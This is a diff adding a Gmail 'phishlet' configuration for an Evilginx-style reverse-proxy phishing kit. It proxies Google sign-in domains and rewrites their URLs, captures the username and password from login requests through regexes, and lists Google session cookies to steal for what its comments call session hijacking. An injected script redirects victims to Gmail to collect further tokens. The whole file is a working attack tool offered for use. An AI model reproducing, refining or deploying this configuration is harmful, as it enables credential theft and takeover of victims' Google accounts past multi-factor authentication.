@@ -1,0 +1,212 @@
+# Gmail Phishlet v4 - Optimized Configuration
+# 
+# This phishlet combines the best elements from:
+# - gmail.yaml (mail.google.com support, GMAIL_AT capture)
+# - google2.yaml (comprehensive sub_filters, stable credential capture)
+# - Fresh HAR analysis (verified domain requirements)
+#
+# Key improvements over previous versions:
+# 1. Added missing fonts.gstatic.com and fonts.googleapis.com (fixes page hanging)
+# 2. Comprehensive sub_filters from google2.yaml (proper URL rewriting)
+# 3. Simplified JS injection (removed complex email monitoring that caused issues)
+# 4. Support for both v2 and v3 login paths
+# 5. Complete cookie capture for session hijacking
+# 6. Removed auto_filter: true which was causing issues
+#
+# Author: @billioncodesInc
+# Version: 4.0.0
+
+name: 'gmail'
+author: '@billioncodesInc'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  # Primary authentication domain - MUST be landing page
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true}
+  
+  # Gmail - critical for GMAIL_AT cookie
+  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'google.com', session: true, is_landing: false}
+  
+  # MyAccount - post-login redirect
+  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false}
+  
+  # Base Google domain
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false}
+  
+  # OGS - One Google Shell (required for UI)
+  - {phish_sub: 'ogs', orig_sub: 'ogs', domain: 'google.com', session: true, is_landing: false}
+  
+  # APIs
+  - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: false, is_landing: false}
+  
+  # Play Store (optional but commonly accessed)
+  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: false, is_landing: false}
+  
+  # Notifications
+  - {phish_sub: 'notifications', orig_sub: 'notifications', domain: 'google.com', session: false, is_landing: false}
+  
+  # Static assets - gstatic.com (CRITICAL - was missing fonts.gstatic.com)
+  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'gstatic.com', session: false, is_landing: false}
+  - {phish_sub: 'fonts', orig_sub: 'fonts', domain: 'gstatic.com', session: false, is_landing: false}
+  
+  # Google APIs - fonts and content (CRITICAL - was missing)
+  - {phish_sub: 'fonts', orig_sub: 'fonts', domain: 'googleapis.com', session: false, is_landing: false}
+  - {phish_sub: 'content', orig_sub: 'content', domain: 'googleapis.com', session: false, is_landing: false}
+  
+  # Profile pictures
+  - {phish_sub: 'lh3', orig_sub: 'lh3', domain: 'googleusercontent.com', session: false, is_landing: false}
+  
+  # YouTube SSO (for cross-service auth)
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'youtube.com', session: false, is_landing: false}
+
+sub_filters:
+  # ============================================================================
+  # accounts.google.com filters - comprehensive URL rewriting
+  # ============================================================================
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  
+  # ============================================================================
+  # www.google.com filters
+  # ============================================================================
+  - {triggers_on: 'accounts.google.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'www', domain: 'google.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'www', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  
+  # ============================================================================
+  # mail.google.com filters
+  # ============================================================================
+  - {triggers_on: 'accounts.google.com', orig_sub: 'mail', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'mail', domain: 'google.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'mail', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'mail.google.com', orig_sub: 'mail', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'mail.google.com', orig_sub: 'mail', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  
+  # ============================================================================
+  # myaccount.google.com filters
+  # ============================================================================
+  - {triggers_on: 'accounts.google.com', orig_sub: 'myaccount', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'myaccount', domain: 'google.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'myaccount', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  
+  # ============================================================================
+  # play.google.com filters
+  # ============================================================================
+  - {triggers_on: 'accounts.google.com', orig_sub: 'play', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'play', domain: 'google.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'play', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  
+  # ============================================================================
+  # ogs.google.com filters
+  # ============================================================================
+  - {triggers_on: 'accounts.google.com', orig_sub: 'ogs', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'ogs', domain: 'google.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'ogs', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  
+  # ============================================================================
+  # apis.google.com filters
+  # ============================================================================
+  - {triggers_on: 'accounts.google.com', orig_sub: 'apis', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'apis', domain: 'google.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'apis', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  
+  # ============================================================================
+  # gstatic.com filters
+  # ============================================================================
+  - {triggers_on: 'accounts.google.com', orig_sub: 'www', domain: 'gstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'www', domain: 'gstatic.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'www', domain: 'gstatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'ssl', domain: 'gstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'ssl', domain: 'gstatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'fonts', domain: 'gstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'fonts', domain: 'gstatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  
+  # ============================================================================
+  # googleapis.com filters
+  # ============================================================================
+  - {triggers_on: 'accounts.google.com', orig_sub: 'fonts', domain: 'googleapis.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'fonts', domain: 'googleapis.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'content', domain: 'googleapis.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'content', domain: 'googleapis.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  
+  # ============================================================================
+  # googleusercontent.com filters
+  # ============================================================================
+  - {triggers_on: 'accounts.google.com', orig_sub: 'lh3', domain: 'googleusercontent.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'lh3', domain: 'googleusercontent.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  
+  # ============================================================================
+  # youtube.com filters
+  # ============================================================================
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'youtube.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'youtube.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+# ============================================================================
+# Authentication Tokens - Complete list for session hijacking
+# ============================================================================
+auth_tokens:
+  - domain: '.google.com'
+    keys: ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'NID', 'SIDCC', '__Secure-1PSID', '__Secure-3PSID', '__Secure-1PAPISID', '__Secure-3PAPISID', '__Secure-1PSIDCC', '__Secure-3PSIDCC', '__Secure-STRP', '1P_JAR', 'OGPC', 'OGP', 'CONSENT']
+  - domain: 'accounts.google.com'
+    keys: ['GAPS', 'LSID', '__Host-1PLSID', '__Host-3PLSID', '__Host-GAPS', 'ACCOUNT_CHOOSER']
+  - domain: 'mail.google.com'
+    keys: ['GMAIL_AT', 'OSID', '__Secure-OSID', 'COMPASS', '__Host-GMAIL_SCH_GML', '__Host-GMAIL_SCH_GMN', '__Host-GMAIL_SCH_GMS']
+
+# ============================================================================
+# Credential Capture - Using google2.yaml's proven patterns as primary
+# with gmail.yaml patterns as fallback
+# ============================================================================
+credentials:
+  username:
+    key: 'identifier'
+    search: '\"identifier\",\"([^\"]+)\"'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '\"password\",\"([^\"]+)\"'
+    type: 'post'
+
+# ============================================================================
+# Auth URLs - Endpoints that trigger credential/token capture
+# ============================================================================
+auth_urls:
+  - '/v3/signin/_/AccountsSignInUi/data/batchexecute'
+  - '/signin/_/AccountsSignInUi/data/batchexecute'
+  - '/_/signin/challenge'
+  - '/CheckCookie'
+  - '/ServiceLogin'
+  - '/accounts/SetOSID'
+
+# ============================================================================
+# Login Configuration - Using simpler path that works with both v2 and v3
+# ============================================================================
+login:
+  domain: 'accounts.google.com'
+  path: '/ServiceLogin'
+
+# ============================================================================
+# Landing Path - For URL generation
+# ============================================================================
+landing_path:
+  - '/signin/v2/identifier'
+  - '/ServiceLogin'
+
+# ============================================================================
+# JS Injection - Simplified, only for redirect to Gmail
+# Removed complex email monitoring that was causing page hangs
+# ============================================================================
+js_inject:
+  # Redirect from myaccount to Gmail after successful login (for GMAIL_AT capture)
+  - trigger_domains: ['myaccount.google.com']
+    trigger_paths: ['/']
+    script: |
+      (function() {
+        // Only redirect if we have session cookies
+        if (document.cookie.includes('SID') && document.cookie.includes('SAPISID')) {
+          setTimeout(function() {
+            window.location.href = 'https://mail.google.com/mail/u/0/';
+          }, 1500);
+        }
+      })();
